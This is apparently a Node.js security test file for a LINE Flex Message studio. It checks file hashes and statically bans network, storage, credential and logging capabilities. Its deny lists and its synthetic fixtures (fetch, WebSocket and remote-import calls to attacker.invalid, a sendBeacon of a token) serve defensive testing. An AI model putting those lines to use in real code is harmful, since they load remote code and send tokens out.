import test from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFile } from "node:fs/promises";
import { dirname, extname, isAbsolute, relative, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { createSandboxVerificationRecord } from "../line-design-approval-record.mjs";
import { PRESETS } from "../line-flex-presets.mjs";
import { designApprovalReceiptCopyFor } from "../line-flex-studio.mjs";
import { VALIDATION_RULES } from "../line-flex-validator.mjs";

const LINE_OS_ROOT = fileURLToPath(new URL("../", import.meta.url));
const toPosix = (value) => value.replaceAll("\\", "/");
const relativeName = (absolutePath) => toPosix(relative(LINE_OS_ROOT, absolutePath));
const read = (name) => readFile(resolve(LINE_OS_ROOT, name), "utf8");

const EXPECTED_MODULES = [
  "line-design-approval-contract.mjs",
  "line-design-approval-record.mjs",
  "line-design-approval-sandbox.mjs",
  "line-flex-actions.mjs",
  "line-flex-json.mjs",
  "line-flex-model.mjs",
  "line-flex-presets.mjs",
  "line-flex-receipt.mjs",
  "line-flex-studio.mjs",
  "line-flex-validator.mjs"
];
const EXPECTED_ASSETS = [
  "assets/line-flex-studio/design-approval-hero.svg",
  "assets/line-flex-studio/issue-evidence-hero.svg",
  "assets/line-flex-studio/quote-order-hero.svg",
  "assets/line-flex-studio/site-update-hero.svg",
  "assets/line-flex-studio/sla-escalation-hero.svg"
];
const EXPECTED_SOURCE_LINKS = [
  "./docs/superpowers/specs/2026-08-01-monolith-line-flex-studio-design.en.html",
  "https://developers.line.biz/en/docs/messaging-api/actions/",
  "https://developers.line.biz/en/docs/messaging-api/flex-message-elements/",
  "https://developers.line.biz/en/reference/messaging-api/"
];
const EXPECTED_DESIGN_APPROVAL_RECEIPT_COPY = {
  en: {
    title: "Sandbox Verification Record — Demo · No Business Effect",
    ribbon: "SANDBOX — NO BUSINESS EFFECT",
    workflowDisclosure: "MONOLITH workflow and approval state did not change. This record captures only the sandbox confirmation attempt.",
    digestDisclosure: "The SHA-256 digest is integrity metadata for this sandbox record, not a digital signature.",
    ready: "Sandbox verification record is ready. Workflow and approval state did not change."
  },
  th: {
    title: "Sandbox Verification Record — Demo · No Business Effect",
    ribbon: "SANDBOX — NO BUSINESS EFFECT",
    workflowDisclosure: "workflow และ approval state ของ MONOLITH ไม่เปลี่ยน บันทึกนี้เก็บเฉพาะการทดลองยืนยันใน Sandbox",
    digestDisclosure: "ค่า SHA-256 digest เป็นข้อมูลตรวจความครบถ้วนของบันทึก Sandbox นี้ ไม่ใช่ลายเซ็นดิจิทัล",
    ready: "บันทึกการยืนยันใน Sandbox พร้อมแล้ว โดย workflow และ approval state ไม่เปลี่ยน"
  }
};
const EXPECTED_LOCAL_SOURCE_RESOURCES = EXPECTED_SOURCE_LINKS
  .filter((value) => value.startsWith("./"))
  .map((value) => value.slice(2));
const EXPECTED_RUNTIME_FILES = [
  "line-flex-studio.html",
  "line-flex-studio.css",
  ...EXPECTED_MODULES,
  ...EXPECTED_ASSETS,
  ...EXPECTED_LOCAL_SOURCE_RESOURCES
].sort();
const EXPECTED_RUNTIME_SHA256 = Object.freeze({
  "assets/line-flex-studio/design-approval-hero.svg": "460fb55418c0c102f5b92437d74bb7a38a17525a6eb0a862970959e24d4c0df2",
  "assets/line-flex-studio/issue-evidence-hero.svg": "910120a6b376b57101427ac3a52b8d45ef646302162434201c8b9890b631637c",
  "assets/line-flex-studio/quote-order-hero.svg": "127a91e454776dfa7b01ad77d312102b61f63285f8112ec423fd01eebac0c48e",
  "assets/line-flex-studio/site-update-hero.svg": "eb5a26a73440d6de7b5a0eb4d0f5de34f6825fef7f3c253066a24ec5a4468e61",
  "assets/line-flex-studio/sla-escalation-hero.svg": "f4c4245c4c3474fd05a22e42f3aa15ffe513ef288f22a8ce05ce154bcf186f8f",
  "docs/superpowers/specs/2026-08-01-monolith-line-flex-studio-design.en.html": "0540bbeae1e2a274080cc5e131cc0ea9ffbfe4ae16ed08e376ceffedc9d6c50e",
  "line-design-approval-contract.mjs": "2c84f8dce9472a4b9b83946998aaf9b5d9ad8b7627d241abeb9f7685660b61bf",
  "line-design-approval-record.mjs": "2a244ff64844517154b64ed584eb65338ed446f01f88619733b74f0d7f7ebd4c",
  "line-design-approval-sandbox.mjs": "633e1b390f7324a4e2059d9cb6634b9a12c501e58e7c18d3a2d2b99a7ff53f0d",
  "line-flex-actions.mjs": "5c030c3064c89a9c57167a0d61e3e1f28f62c354b8c52c783903ca4f8ffc0df9",
  "line-flex-json.mjs": "04575581cd9b8b7d5f6dacbebc418871abd85b57dbb1976d8a91d08da23023d5",
  "line-flex-model.mjs": "87b1e968d7550400c5e4fe8c6d0481988b56380892e3fd03c5d9009d4a25a36a",
  "line-flex-presets.mjs": "091b79d06b619e15a7a10d89f09ae480189caca744e31c173d551c5cd7278a14",
  "line-flex-receipt.mjs": "20a34348f29e26833d013c47780094e69b39f50927b12423d7adec768f4dab76",
  "line-flex-studio.css": "3fbf6138a8dd2b69bc27a2a52f74853fc71e5a227f50d051721a8096209ad9b7",
  "line-flex-studio.html": "a0ff1165a4df205e54f3247c01025fbb1af1923d95873c0ddc153149b014ac7b",
  "line-flex-studio.mjs": "175b690175f0a4e14ec61ab17ee8ebe5f7e6a6c214ecdd8853bc394429a258f5",
  "line-flex-validator.mjs": "78d4f1319e54409380539adcf54ba6139cd1b29cc5e9641c98a5942f983c1d5e"
});

const EXPECTED_DYNAMIC_RESOURCE_BINDINGS = [
  "line-flex-studio.mjs:href:finding.sourceUrl",
  "line-flex-studio.mjs:href:url",
  "line-flex-studio.mjs:src:draft.hero.localAsset"
];

const DESIGN_APPROVAL_TEST_FILES = [
  "tests/line-design-approval-contract.test.mjs",
  "tests/line-design-approval-record.test.mjs",
  "tests/line-design-approval-sandbox.test.mjs",
  "tests/line-design-approval-security.test.mjs",
  "tests/line-flex-json-validator.test.mjs",
  "tests/line-flex-structure.test.mjs",
  "tests/line-flex-studio-state.test.mjs"
];
const NEW_DESIGN_APPROVAL_TEST_FILES = DESIGN_APPROVAL_TEST_FILES.slice(0, 4);
const CORE_TEST_FILES = [
  "tests/line-flex-model.test.mjs",
  "tests/line-flex-json-validator.test.mjs",
  "tests/line-flex-actions-receipt.test.mjs",
  "tests/line-flex-studio-state.test.mjs",
  ...NEW_DESIGN_APPROVAL_TEST_FILES
];

const IDENTIFIER_START = /[A-Za-z_$]/;
const IDENTIFIER_PART = /[A-Za-z0-9_$]/;
const REGEX_PREFIX_KEYWORDS = new Set([
  "await", "case", "delete", "else", "in", "instanceof", "new", "of",
  "return", "throw", "typeof", "void", "yield"
]);
const REGEX_PREFIX_PUNCTUATORS = new Set([
  "(", "[", "{", ",", ";", ":", "=", "==", "===", "!=", "!==",
  "!", "?", "&&", "||", "??", "+", "-", "*", "%", "&", "|", "^",
  "~", "<", ">", "<=", ">=", "=>"
]);
const MULTI_CHARACTER_PUNCTUATORS = [
  "===", "!==", "...", "=>", "?.", "==", "!=", "<=", ">=", "&&",
  "||", "??", "++", "--", "**"
];
const SINGLE_CHARACTER_PUNCTUATORS = new Set(
  ["{", "}", "(", ")", "[", "]", ";", ",", ".", ":", "=", "!", "?",
    "+", "-", "*", "%", "&", "|", "^", "~", "<", ">", "/"]
);

function tokenizeJavaScript(source, label = "source") {
  const tokens = [];
  let index = 0;

  const fail = (message) => assert.fail(`${label}: ${message} at byte ${index}`);
  const add = (type, value, start, extra = {}) => {
    tokens.push({ type, value, start, end: index, ...extra });
  };
  const regexCanStart = () => {
    const previous = tokens.at(-1);
    if (!previous) return true;
    return (previous.type === "identifier" && REGEX_PREFIX_KEYWORDS.has(previous.value)) ||
      (previous.type === "punctuator" && REGEX_PREFIX_PUNCTUATORS.has(previous.value));
  };

  const readString = () => {
    const start = index;
    const quote = source[index++];
    let value = "";
    let escaped = false;
    while (index < source.length) {
      const character = source[index++];
      if (character === quote) {
        add("string", value, start, { escaped });
        return;
      }
      if (character === "\\") {
        escaped = true;
        if (index >= source.length) fail("unterminated string escape");
        value += character + source[index++];
        continue;
      }
      if (character === "\n" || character === "\r") fail("unterminated string literal");
      value += character;
    }
    fail("unterminated string literal");
  };

  const readRegex = () => {
    const start = index++;
    let inCharacterClass = false;
    while (index < source.length) {
      const character = source[index++];
      if (character === "\\") {
        if (index >= source.length) fail("unterminated regular expression escape");
        index += 1;
        continue;
      }
      if (character === "[") inCharacterClass = true;
      else if (character === "]") inCharacterClass = false;
      else if (character === "/" && !inCharacterClass) {
        while (index < source.length && /[A-Za-z]/.test(source[index])) index += 1;
        add("regex", source.slice(start, index), start);
        return;
      } else if (character === "\n" || character === "\r") {
        fail("unterminated regular expression literal");
      }
    }
    fail("unterminated regular expression literal");
  };

  const scanTemplate = () => {
    index += 1;
    let chunkStart = index;
    let value = "";
    let escaped = false;
    const flushChunk = () => {
      if (value.length > 0) tokens.push({
        type: "template", value, start: chunkStart, end: index, escaped
      });
      value = "";
      escaped = false;
    };
    while (index < source.length) {
      const character = source[index];
      if (character === "\\") {
        escaped = true;
        if (index + 1 >= source.length) fail("unterminated template escape");
        value += character + source[index + 1];
        index += 2;
      } else if (character === "`") {
        flushChunk();
        index += 1;
        return;
      } else if (character === "$" && source[index + 1] === "{") {
        flushChunk();
        index += 2;
        scanCode(true);
        chunkStart = index;
      } else {
        value += character;
        index += 1;
      }
    }
    fail("unterminated template literal");
  };

  const scanCode = (stopAtTemplateBrace = false) => {
    let braceDepth = 0;
    while (index < source.length) {
      const character = source[index];
      if (/\s/.test(character)) {
        index += 1;
        continue;
      }
      if (character === "/" && source[index + 1] === "/") {
        index += 2;
        while (index < source.length && source[index] !== "\n") index += 1;
        continue;
      }
      if (character === "/" && source[index + 1] === "*") {
        const end = source.indexOf("*/", index + 2);
        if (end < 0) fail("unterminated block comment");
        index = end + 2;
        continue;
      }
      if (character === "\"" || character === "'") {
        readString();
        continue;
      }
      if (character === "`") {
        scanTemplate();
        continue;
      }
      if (character === "/" && regexCanStart()) {
        readRegex();
        continue;
      }
      if (IDENTIFIER_START.test(character)) {
        const start = index++;
        while (index < source.length && IDENTIFIER_PART.test(source[index])) index += 1;
        add("identifier", source.slice(start, index), start);
        continue;
      }
      if (/[0-9]/.test(character)) {
        const start = index++;
        while (index < source.length && /[A-Za-z0-9_.]/.test(source[index])) index += 1;
        add("number", source.slice(start, index), start);
        continue;
      }
      if (character === "{" ) {
        const start = index++;
        braceDepth += 1;
        add("punctuator", character, start);
        continue;
      }
      if (character === "}") {
        if (stopAtTemplateBrace && braceDepth === 0) {
          index += 1;
          return;
        }
        if (braceDepth === 0) fail("unmatched closing brace");
        const start = index++;
        braceDepth -= 1;
        add("punctuator", character, start);
        continue;
      }
      const punctuator = MULTI_CHARACTER_PUNCTUATORS
        .find((candidate) => source.startsWith(candidate, index)) ?? character;
      assert.ok(punctuator !== character || SINGLE_CHARACTER_PUNCTUATORS.has(character),
        `${label}: unknown punctuator ${JSON.stringify(character)} at byte ${index}`);
      const start = index;
      index += punctuator.length;
      add("punctuator", punctuator, start);
    }
    if (stopAtTemplateBrace) fail("unterminated template expression");
    if (braceDepth !== 0) fail("unclosed brace");
  };

  scanCode();
  return tokens;
}

function moduleSpecifierFrom(token, label) {
  assert.equal(token?.type, "string", `${label}: module specifier must be a string literal`);
  assert.equal(token.escaped, false, `${label}: escaped module specifiers are unclassified`);
  return token.value;
}

function moduleSpecifiersFromTokens(tokens, label) {
  const specifiers = [];
  for (let index = 0; index < tokens.length; index += 1) {
    const token = tokens[index];
    if (token.type === "identifier" && token.value === "import") {
      const next = tokens[index + 1];
      if (next?.value === "." && tokens[index + 2]?.value === "meta") {
        index += 2;
        continue;
      }
      assert.notEqual(next?.value, "(", `${label}: dynamic import is forbidden`);
      if (next?.type === "string") {
        specifiers.push(moduleSpecifierFrom(next, label));
        index += 1;
        continue;
      }

      let depth = 0;
      let fromIndex = -1;
      for (let cursor = index + 1; cursor < tokens.length; cursor += 1) {
        const candidate = tokens[cursor];
        if (["(", "[", "{"].includes(candidate.value)) depth += 1;
        else if ([")", "]", "}"].includes(candidate.value)) depth -= 1;
        else if (candidate.value === "from" && depth === 0) {
          fromIndex = cursor;
          break;
        } else if (candidate.value === ";" && depth === 0) {
          break;
        }
      }
      assert.ok(fromIndex > index, `${label}: unclassified import token`);
      specifiers.push(moduleSpecifierFrom(tokens[fromIndex + 1], label));
      index = fromIndex + 1;
      continue;
    }

    if (token.type !== "identifier" || token.value !== "export") continue;
    const next = tokens[index + 1];
    let cursor = -1;
    if (next?.value === "*") {
      cursor = index + 2;
      if (tokens[cursor]?.value === "as") cursor += 2;
    } else if (next?.value === "{") {
      let depth = 1;
      cursor = index + 2;
      while (cursor < tokens.length && depth > 0) {
        if (tokens[cursor].value === "{") depth += 1;
        else if (tokens[cursor].value === "}") depth -= 1;
        cursor += 1;
      }
      assert.equal(depth, 0, `${label}: unclosed export list`);
    }
    if (cursor >= 0 && tokens[cursor]?.value === "from") {
      specifiers.push(moduleSpecifierFrom(tokens[cursor + 1], label));
      index = cursor + 1;
    }
  }
  return specifiers;
}

function staticImportSpecifiers(source, label = "source") {
  return moduleSpecifiersFromTokens(tokenizeJavaScript(source, label), label);
}

function resolveLocalModule(importer, specifier) {
  assert.match(specifier, /^\.\//, `${relativeName(importer)}: non-local module ${specifier}`);
  assert.doesNotMatch(specifier, /[?#]|(?:https?|data|blob):/i,
    `${relativeName(importer)}: decorated or remote module ${specifier}`);
  const target = resolve(dirname(importer), specifier);
  const boundary = relative(LINE_OS_ROOT, target);
  assert.ok(boundary !== "" && !boundary.startsWith("..") && !isAbsolute(boundary),
    `${relativeName(importer)}: module escapes LineOS`);
  assert.equal(extname(target), ".mjs", `${relativeName(importer)}: module must be .mjs`);
  return target;
}

async function discoverModuleClosure(entryName) {
  const pending = [resolve(LINE_OS_ROOT, entryName)];
  const sources = new Map();
  while (pending.length > 0) {
    const current = pending.pop();
    if (sources.has(current)) continue;
    const source = await readFile(current, "utf8");
    sources.set(current, source);
    for (const specifier of staticImportSpecifiers(source)) {
      pending.push(resolveLocalModule(current, specifier));
    }
  }
  return sources;
}

function htmlLocalResources(html) {
  const resourceAttribute = /\b(?:href|src|srcset|poster|data|ping|action|formaction)\s*=\s*(["'])(.*?)\1/gi;
  const values = [...html.matchAll(resourceAttribute)].map((match) => match[2]);
  const unquotedCount = [...html.matchAll(
    /\b(?:href|src|srcset|poster|data|ping|action|formaction)\s*=/gi
  )].length;
  assert.equal(values.length, unquotedCount, "every shell resource attribute must be quoted");
  return values.filter((value) => {
    if (/^#[A-Za-z][A-Za-z0-9_.:-]*$/.test(value)) return false;
    assert.match(value, /^\.\//, `unclassified or remote shell resource ${value}`);
    assert.doesNotMatch(value, /[?#]|(?:https?|data|blob):/i,
      `decorated or remote shell resource ${value}`);
    return true;
  });
}

const FORBIDDEN_IDENTIFIERS = new Map([
  ["fetch", "network fetch"], ["XMLHttpRequest", "XMLHttpRequest"],
  ["WebSocket", "WebSocket"], ["EventSource", "EventSource"],
  ["eval", "dynamic code"], ["Function", "dynamic-code constructor"],
  ["AsyncFunction", "dynamic-code constructor"],
  ["GeneratorFunction", "dynamic-code constructor"],
  ["AsyncGeneratorFunction", "dynamic-code constructor"],
  ["constructor", "dynamic-code constructor"],
  ["sendBeacon", "sendBeacon"], ["createClient", "Supabase client"],
  ["supabase", "Supabase client"], ["console", "logging"], ["logger", "logging"],
  ["Headers", "header construction"], ["process", "process environment"],
  ["localStorage", "localStorage"], ["sessionStorage", "sessionStorage"],
  ["indexedDB", "IndexedDB"], ["IDBDatabase", "IndexedDB"],
  ["IDBFactory", "IndexedDB"], ["IDBObjectStore", "IndexedDB"],
  ["IDBTransaction", "IndexedDB"], ["cookieStore", "cookies"],
  ["caches", "Cache Storage"], ["CacheStorage", "Cache Storage"],
  ["StorageManager", "Storage Manager"],
  ["openDatabase", "Web SQL"], ["showSaveFilePicker", "persistent file access"],
  ["showOpenFilePicker", "persistent file access"],
  ["FileSystemFileHandle", "persistent file access"],
  ["FileSystemDirectoryHandle", "persistent file access"],
  ["innerHTML", "HTML injection"], ["outerHTML", "HTML injection"],
  ["insertAdjacentHTML", "HTML injection"], ["location", "remote navigation"],
  ["defineProperty", "reflective resource mutation"],
  ["defineProperties", "reflective resource mutation"]
]);
const ALLOWED_LOCAL_DIALOG_MEMBERS = new Set([
  "addEventListener", "close", "open", "querySelector", "showModal"
]);
const RESOURCE_PROPERTIES = new Set(["src", "srcset", "href", "poster"]);
const RESOURCE_MUTATION_PROPERTIES = new Set([
  ...RESOURCE_PROPERTIES, "action", "formAction", "formaction"
]);
const LOADER_TAGS = new Set([
  "script", "iframe", "frame", "link", "object", "embed", "video", "audio",
  "source", "track", "form"
]);
const STRING_CODE_TIMERS = new Set(["setTimeout", "setInterval"]);

function canonicalToken(token) {
  if (["string", "template"].includes(token.type)) return JSON.stringify(token.value);
  return token.value;
}

function compactTokens(tokens) {
  return tokens.map(canonicalToken).join("");
}

function memberAfter(tokens, index, label) {
  let cursor = index + 1;
  if (tokens[cursor]?.value === "?.") cursor += 1;
  else if (tokens[cursor]?.value === ".") cursor += 1;
  else if (tokens[cursor]?.value === "[") {
    const property = tokens[cursor + 1];
    assert.equal(property?.type, "string", `${label}: computed member must use a literal`);
    assert.equal(property.escaped, false, `${label}: escaped computed member is unclassified`);
    assert.equal(tokens[cursor + 2]?.value, "]", `${label}: computed member is unclassified`);
    return { name: property.value, end: cursor + 2 };
  } else {
    return null;
  }
  const property = tokens[cursor];
  assert.equal(property?.type, "identifier", `${label}: member name is unclassified`);
  return { name: property.value, end: cursor };
}

function expressionAfter(tokens, start) {
  const expression = [];
  const closing = new Map([["(", ")"], ["[", "]"], ["{", "}"]]);
  const stack = [];
  for (let index = start; index < tokens.length; index += 1) {
    const token = tokens[index];
    if (stack.length === 0 && [",", ";", "}"].includes(token.value)) break;
    if (closing.has(token.value)) stack.push(closing.get(token.value));
    else if (stack.at(-1) === token.value) stack.pop();
    expression.push(token);
  }
  return expression;
}

function forbiddenNameReason(name) {
  const direct = FORBIDDEN_IDENTIFIERS.get(name);
  if (direct) return direct;
  const normalized = name.replaceAll("_", "").toLowerCase();
  if (normalized === "authorization") return "authorization header";
  if (name.startsWith("SUPABASE_") ||
      ["servicekey", "servicerolekey", "servicerole"].includes(normalized)) {
    return "service key";
  }
  return null;
}

function assertAllowedSecurityName(name, label) {
  const reason = forbiddenNameReason(name);
  assert.equal(reason, null, `${label}: forbidden ${reason}`);
}

function semanticSecurityChecks(tokens, label) {
  for (let index = 0; index < tokens.length; index += 1) {
    const token = tokens[index];
    if (["string", "template"].includes(token.type)) {
      assert.equal(token.escaped, false, `${label}: escaped literal is unclassified`);
      assert.doesNotMatch(token.value, /\bbearer\s+[A-Za-z0-9._~-]+/i,
        `${label}: forbidden bearer credential`);
      assert.notEqual(token.value.toLowerCase(), "authorization",
        `${label}: forbidden authorization header`);
      const computedMember = token.type === "string" &&
        tokens[index - 1]?.value === "[" && tokens[index + 1]?.value === "]";
      if (computedMember) assertAllowedSecurityName(token.value, label);
      if (computedMember && STRING_CODE_TIMERS.has(token.value) &&
          tokens[index + 2]?.value === "(") {
        assert.equal(["string", "template"].includes(tokens[index + 3]?.type), false,
          `${label}: forbidden string-code timer`);
      }
      if (computedMember &&
          RESOURCE_MUTATION_PROPERTIES.has(token.value)) {
        assert.equal([":", "="].includes(tokens[index + 2]?.value), false,
          `${label}: forbidden computed resource binding or mutation`);
      }
      continue;
    }
    if (token.type !== "identifier") continue;

    assertAllowedSecurityName(token.value, label);

    if (token.value === "liff") {
      const previous = tokens[index - 1]?.value;
      if (["const", "let", "var"].includes(previous) && tokens[index + 1]?.value === "=") continue;
      const member = memberAfter(tokens, index, label);
      assert.ok(member && ALLOWED_LOCAL_DIALOG_MEMBERS.has(member.name),
        `${label}: forbidden or unclassified LINE SDK access`);
    }

    if (STRING_CODE_TIMERS.has(token.value) && tokens[index + 1]?.value === "(") {
      assert.equal(["string", "template"].includes(tokens[index + 2]?.type), false,
        `${label}: forbidden string-code timer`);
    }
    if (token.value === "open" && tokens[index + 1]?.value === "(") {
      const previous = tokens[index - 1]?.value;
      const qualified = [".", "?.", "]"].includes(previous);
      const declaration = ["async", "function"].includes(previous);
      assert.equal(qualified || declaration, true,
        `${label}: forbidden unqualified global open`);
    }

    if (["window", "self", "globalThis"].includes(token.value)) {
      const member = memberAfter(tokens, index, label);
      if (member) assertAllowedSecurityName(member.name, label);
      assert.notEqual(member?.name, "liff", `${label}: forbidden LINE SDK access`);
      assert.notEqual(member?.name, "open", `${label}: forbidden remote navigation`);
    }
    if (token.value === "Reflect") {
      const member = memberAfter(tokens, index, label);
      assert.notEqual(member?.name, "set", `${label}: forbidden reflective mutation`);
    }
    if (token.value === "navigator") {
      const member = memberAfter(tokens, index, label);
      assert.notEqual(member?.name, "storage", `${label}: forbidden Storage Manager`);
      assert.notEqual(member?.name, "sendBeacon", `${label}: forbidden sendBeacon`);
    }
    if (token.value === "document") {
      const member = memberAfter(tokens, index, label);
      assert.notEqual(member?.name, "cookie", `${label}: forbidden cookies`);
    }

    if (token.value === "setAttribute" && tokens[index + 1]?.value === "(") {
      const property = tokens[index + 2];
      assert.equal(property?.type === "string" &&
        RESOURCE_MUTATION_PROPERTIES.has(property.value), false,
      `${label}: forbidden direct resource mutation`);
    }
    if (["createElement", "make"].includes(token.value) && tokens[index + 1]?.value === "(") {
      const argumentsStart = token.value === "make" ? index + 4 : index + 2;
      const tag = tokens[argumentsStart];
      assert.equal(tag?.type === "string" && LOADER_TAGS.has(tag.value.toLowerCase()), false,
        `${label}: forbidden dynamic loader element`);
    }

    const previous = tokens[index - 1];
    const next = tokens[index + 1];
    if (RESOURCE_MUTATION_PROPERTIES.has(token.value) &&
        previous?.value === "." && next?.value === "=") {
      assert.fail(`${label}: forbidden direct resource mutation`);
    }
  }
}

function dynamicResourceBindings(fileName, tokens) {
  const bindings = [];
  for (let index = 0; index < tokens.length - 2; index += 1) {
    const property = tokens[index];
    if (!["identifier", "string"].includes(property.type) ||
        !RESOURCE_PROPERTIES.has(property.value.toLowerCase()) ||
        tokens[index + 1]?.value !== ":") continue;
    const expression = expressionAfter(tokens, index + 2);
    assert.ok(expression.length > 0, `${fileName}: empty resource binding`);
    bindings.push(`${fileName}:${property.value.toLowerCase()}:${compactTokens(expression)}`);
  }
  return bindings;
}

function assignmentsFor(tokens, identifier) {
  const assignments = [];
  for (let index = 0; index < tokens.length - 2; index += 1) {
    if (tokens[index].type === "identifier" && tokens[index].value === identifier &&
        tokens[index + 1].value === "=") {
      assignments.push(compactTokens(expressionAfter(tokens, index + 2)));
    }
  }
  return assignments;
}

function assertApprovedResourceProvenance(fileName, source, tokens, bindings) {
  for (const binding of bindings) {
    if (binding === `${fileName}:src:draft.hero.localAsset`) {
      assert.equal(fileName, "line-flex-studio.mjs");
      assert.deepEqual(
        Object.values(PRESETS).map(({ base }) => base.hero.localAsset).sort(),
        EXPECTED_ASSETS.map((value) => `./${value}`).sort()
      );
      const fieldsStart = source.indexOf("const FIELDS =");
      const fieldsEnd = source.indexOf("const COPY =", fieldsStart);
      assert.ok(fieldsStart >= 0 && fieldsEnd > fieldsStart,
        `${fileName}: editable field inventory is unclassified`);
      assert.doesNotMatch(source.slice(fieldsStart, fieldsEnd), /localAsset/,
        `${fileName}: local preview asset must not be editable`);
    } else if (binding === `${fileName}:href:finding.sourceUrl`) {
      assert.equal(fileName, "line-flex-studio.mjs");
      assert.deepEqual(
        [...new Set(VALIDATION_RULES.map(({ sourceUrl }) => sourceUrl))].sort(),
        EXPECTED_SOURCE_LINKS
      );
      assert.match(source,
        /import\s*\{\s*validateDraft\s*\}\s*from\s*["']\.\/line-flex-validator\.mjs["']/,
      `${fileName}: finding source producer must be the local validator`);
      assert.match(source, /const findings = validateDraft\(state\.draft, message\);/,
        `${fileName}: finding source producer must be the local validator`);
    } else if (binding === `${fileName}:href:url`) {
      assert.equal(fileName, "line-flex-studio.mjs");
      assert.deepEqual(assignmentsFor(tokens, "url"), ["null", "URLApi.createObjectURL(blob)"],
        `${fileName}: download URL must only come from createObjectURL`);
      assert.deepEqual(assignmentsFor(tokens, "URLApi"), ["doc.defaultView.URL"],
        `${fileName}: URL API must come from the document view`);
      assert.match(compactTokens(tokens),
        /doc\.defaultView\.URL\.revokeObjectURL\(url\)/,
      `${fileName}: download URL must be revoked`);
    } else {
      assert.fail(`${binding}: no approved resource provenance policy`);
    }
  }
}

function assertNoRestrictedCapabilities(entries, allowedBindings = []) {
  const bindings = [];
  for (const [fileName, source] of entries) {
    const tokens = tokenizeJavaScript(source, fileName);
    for (const specifier of moduleSpecifiersFromTokens(tokens, fileName)) {
      assert.match(specifier, /^\.\//, `${fileName}: unclassified module ${specifier}`);
    }
    semanticSecurityChecks(tokens, fileName);
    const fileBindings = dynamicResourceBindings(fileName, tokens);
    assertApprovedResourceProvenance(fileName, source, tokens, fileBindings);
    bindings.push(...fileBindings);
  }
  assert.deepEqual(bindings.sort(), [...allowedBindings].sort(),
    "dynamic resource bindings must match the exact classification inventory");
}

function canonicalLf(content) {
  return content.replace(/\r\n?/g, "\n");
}

function sha256(content) {
  return createHash("sha256").update(canonicalLf(content), "utf8").digest("hex");
}

async function assertExactRuntimeContentManifest(overrides = new Map()) {
  assert.ok(overrides instanceof Map, "runtime manifest overrides must be a Map");
  assert.deepEqual(Object.keys(EXPECTED_RUNTIME_SHA256).sort(), EXPECTED_RUNTIME_FILES,
    "runtime manifest file inventory must match the exact runtime inventory");

  for (const name of overrides.keys()) {
    assert.ok(Object.hasOwn(EXPECTED_RUNTIME_SHA256, name),
      `${name}: unknown runtime manifest override`);
  }

  for (const name of EXPECTED_RUNTIME_FILES) {
    const content = overrides.has(name) ? overrides.get(name) : await read(name);
    assert.equal(typeof content, "string", `${name}: runtime manifest content must be text`);
    assert.equal(sha256(content), EXPECTED_RUNTIME_SHA256[name],
      `${name}: runtime content manifest mismatch`);
  }
}

const POSITIVE_AUTHORITY_CLAIMS = [
  /\bproduction[- ]ready\b/i,
  /\bready\s+for\s+production\b/i,
  /\bproduction\s+(?:authority|approval|signature)\b/i,
  /\b(?:approved|signed|audited)\b/i,
  /\b(?:approval|audit)\s+(?:complete|recorded|succeeded)\b/i,
  /\bverified\s+signer\b/i,
  /อนุมัติแล้ว/u,
  /พร้อมใช้งานจริง/u
];

function assertNoPositiveAuthorityClaim(value, label = "value") {
  for (const pattern of POSITIVE_AUTHORITY_CLAIMS) {
    assert.doesNotMatch(value, pattern, `${label}: false authority or production claim`);
  }
}

function assertCoreCommand(coreCommand) {
  assert.equal(coreCommand, `node --test ${CORE_TEST_FILES.join(" ")}`,
    "test:core must match the exact approved test inventory and order");
}

test("runtime inventory is the exact recursive local shell and module closure", async () => {
  const html = await read("line-flex-studio.html");
  const shellResources = htmlLocalResources(html);
  assert.deepEqual(shellResources, ["./line-flex-studio.css", "./line-flex-studio.mjs"]);

  const moduleSources = await discoverModuleClosure("line-flex-studio.mjs");
  assert.deepEqual([...moduleSources.keys()].map(relativeName).sort(), EXPECTED_MODULES);

  const localAssets = Object.values(PRESETS).map(({ base }) => base.hero.localAsset);
  assert.deepEqual(localAssets.map((value) => value.replace(/^\.\//, "")).sort(), EXPECTED_ASSETS);
  for (const asset of localAssets) {
    assert.match(asset, /^\.\/assets\/line-flex-studio\/[a-z0-9-]+\.svg$/);
    await read(asset);
  }
  for (const resource of EXPECTED_LOCAL_SOURCE_RESOURCES) await read(resource);

  const observed = [
    "line-flex-studio.html",
    ...shellResources.map((value) => value.replace(/^\.\//, "")),
    ...moduleSources.keys().map(relativeName).filter((name) => name !== "line-flex-studio.mjs"),
    ...localAssets.map((value) => value.replace(/^\.\//, "")),
    ...EXPECTED_LOCAL_SOURCE_RESOURCES
  ].sort();
  assert.deepEqual(observed, EXPECTED_RUNTIME_FILES);
});

test("runtime module closure has no network, persistence, SDK, credential, or logging capability", async () => {
  const moduleSources = await discoverModuleClosure("line-flex-studio.mjs");
  const entries = [...moduleSources].map(([path, source]) => [relativeName(path), source]);
  assertNoRestrictedCapabilities(entries, EXPECTED_DYNAMIC_RESOURCE_BINDINGS);

  const css = await read("line-flex-studio.css");
  assert.doesNotMatch(css, /@import|url\s*\(/i);
  assert.deepEqual(
    [...new Set(VALIDATION_RULES.map(({ sourceUrl }) => sourceUrl))].sort(),
    EXPECTED_SOURCE_LINKS
  );
});

test("unsafe synthetic sources fail closed for every restricted capability class", async (t) => {
  const fixtures = [
    ["fetch", "fetch('https://attacker.invalid')"],
    ["XHR", "new XMLHttpRequest()"],
    ["WebSocket", "new WebSocket('wss://attacker.invalid')"],
    ["EventSource", "new EventSource('/events')"],
    ["beacon", "navigator.sendBeacon('/collect', token)"],
    ["remote import", "await import('https://attacker.invalid/sdk.mjs')"],
    ["comment-separated static import", "import/*gap*/ value from 'https://attacker.invalid/sdk.mjs'"],
    ["no-space static import", "import{default as value}from'https://attacker.invalid/sdk.mjs'"],
    ["multiline static import", "import\nvalue\nfrom\n'https://attacker.invalid/sdk.mjs'"],
    ["comment-separated export-from", "export/*gap*/{default as value}from'https://attacker.invalid/sdk.mjs'"],
    ["comment-separated dynamic import", "await import/*gap*/('https://attacker.invalid/sdk.mjs')"],
    ["bare LINE import", "import client from '@line/bot-sdk'"],
    ["LINE token API", "liff.getIDToken()"],
    ["LINE profile API", "liff.getProfile()"],
    ["Supabase", "createClient(url, key)"],
    ["computed Supabase call", "const supabase = client; supabase['from']('records')"],
    ["Authorization", "const headers = { Authorization: secret }"],
    ["Headers Authorization tuple", "new Headers([['Authorization', token]])"],
    ["service key", "const serviceKey = secret"],
    ["Supabase service role environment key", "const key = SUPABASE_SERVICE_ROLE_KEY"],
